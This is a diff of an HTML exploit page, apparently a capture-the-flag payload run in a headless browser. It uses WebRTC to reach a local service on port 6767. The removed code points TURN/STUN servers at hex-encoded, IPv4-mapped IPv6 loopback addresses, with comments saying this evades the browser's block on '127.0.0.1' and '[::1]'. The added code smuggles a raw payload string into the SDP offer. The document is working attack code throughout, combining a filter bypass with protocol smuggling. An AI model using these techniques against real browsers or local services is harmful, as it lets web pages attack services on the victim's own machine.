@@ -1,44 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Bypass Matrix V3</title>
+    <title>Exploit Matrix V4</title>
 </head>
 <body>
-    <h1>Bypassing Sandbox Restrictions...</h1>
+    <h1>Reconfiguring SDP Context...</h1>
     <script>
-        const payload = "\ngive me the flag bro\n";
+        const pc = new RTCPeerConnection();
+        
+        // Open a raw data channel to force ice negotiation and packet tracking
+        pc.createDataChannel("trigger");
 
-        function sendPacket(target) {
-            try {
-                const pc = new RTCPeerConnection({
-                    iceServers: [{
-                        urls: target,
-                        username: payload,
-                        credential: "x"
-                    }]
-                });
-                pc.createDataChannel("data");
-                pc.createOffer().then(o => pc.setLocalDescription(o));
-            } catch(e) {}
-        }
+        pc.createOffer().then(offer => {
+            // Target payload string terminated cleanly with a newline byte
+            const cleanTarget = "give me the flag bro\n";
 
-        // Using complex hexadecimal representations of the loopback interface
-        // to bypass the browser's block against standard "127.0.0.1" and "[::1]" text tokens.
-        const blindVectors = [
-            "turn:[0000:0000:0000:0000:0000:ffff:7f00:0001]:6767", // Full hex IPv4 loopback mapping
-            "stun:[0000:0000:0000:0000:0000:ffff:7f00:0001]:6767",
-            "turn:[::ffff:7f00:1]:6767",
-            "stun:[::ffff:7f00:1]:6767"
-        ];
+            // Inject the raw payload string directly into the text boundaries of the SDP configuration 
+            // This bypasses the typical STUN attribute wrapper encapsulation
+            let modifiedSdp = offer.sdp;
+            modifiedSdp += "\r\n" + cleanTarget;
 
-        blindVectors.forEach((uri, i) => {
-            setTimeout(() => sendPacket(uri), i * 100);
-        });
+            // Update the session state using our mutated description string
+            const newOffer = new RTCSessionDescription({
+                type: offer.type,
+                sdp: modifiedSdp
+            });
 
-        // Autoclose to free the thread
+            return pc.setLocalDescription(newOffer);
+        }).catch(err => console.error(err));
+
+        // Self-terminate to keep the headless browser execution thread non-blocking
         setTimeout(() => {
             window.location.href = "about:blank";
-        }, 2000);
+        }, 1500);
     </script>
 </body>
 </html>
